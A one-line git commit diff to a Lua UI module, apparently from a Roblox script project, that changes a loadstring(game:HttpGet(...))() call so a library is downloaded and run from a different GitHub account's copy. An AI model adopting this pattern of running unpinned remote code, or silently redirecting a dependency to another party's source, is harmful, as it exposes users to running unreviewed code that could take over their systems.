8340fba4867b0c84fbd4c5e0233eae4342649e1c
warden-cc <bloxstrapkachu@gmail.com>
2026-04-01 21:52:17 -0300

    Update Ui.lua

--- src/lib/Ui.lua
+++ src/lib/Ui.lua
@@ -74,7 +74,7 @@ type Log = {
 local SetClipboard = setclipboard or toclipboard or set_clipboard
 
 --// Libraries
-local ReGui = loadstring(game:HttpGet('https://github.com/depthso/Dear-ReGui/raw/refs/heads/main/ReGui.lua'), "ReGui")()
+local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/myethg/Dear-ReGui/refs/heads/main/ReGui.lua'), "ReGui")()
 
 --// Modules
 local Flags
